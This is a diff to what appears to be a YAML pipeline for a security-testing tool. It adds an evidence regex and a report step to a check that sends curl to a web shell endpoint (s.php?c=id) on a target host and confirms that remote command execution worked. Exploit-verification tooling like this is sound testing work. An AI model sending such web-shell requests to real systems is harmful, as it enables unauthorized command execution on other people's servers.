@@ -25,3 +25,12 @@ steps:
     image: curlimages/curl:latest
     commands:
       - curl -f -v http://${target_host}:${target_port}/s.php?c=id
+    evidence:
+      - name: command_output
+        type: output
+        regexp: uid=\d+\(\w+\) gid=\d+\(\w+\) groups=(?:,?\d+\(\w+\))+
+
+  - name: Report
+    image: bash
+    commands:
+      - 'echo "Exploit command response: $${EVIDENCE_COMMAND_OUTPUT}"'
